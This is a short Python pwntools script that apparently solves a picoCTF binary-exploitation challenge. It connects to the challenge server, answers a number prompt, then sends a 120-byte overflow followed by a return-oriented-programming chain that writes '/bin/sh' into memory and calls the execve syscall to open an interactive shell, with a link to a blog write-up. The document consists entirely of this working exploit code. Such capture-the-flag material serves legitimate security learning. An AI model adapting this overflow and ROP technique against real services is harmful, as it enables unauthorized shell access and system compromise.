from pwn import *
r = remote("jupiter.challenges.picoctf.org", 28953)

r.recvuntil("What number would you like to guess?")
r.sendline("84")

r.recvuntil("Name?")

#write
p = "A" * 120
p += p64(0x4163f4) # pop rax ; ret
p += '/bin/sh\x00'
p += p64(0x410ca3) # pop rsi ; ret
p += p64(0x6ba160) # empty data address that I want /bin/sh to be in
p += p64(0x47ff91) # mov qword ptr [rsi], rax ; ret

#execute
p += p64(0x400696) # pop rdi ; ret
p += p64(0x6ba160) # empty data address that /bin/sh is in
p += p64(0x410ca3) # pop rsi ; ret
p += p64(0x0) # arguments
p += p64(0x44a6b5) # pop rdx ; ret
p += p64(0x0) # environment variables
p += p64(0x4163f4) # pop rax ; ret ; pops 59 into rax
p += p64(0x3b) # 59
p += p64(0x40137c) # syscallprint(p)

r.sendline(p)
r.interactive()

# https://alisyakainth.medium.com/hacking-series-part-3-ba08e83989b6
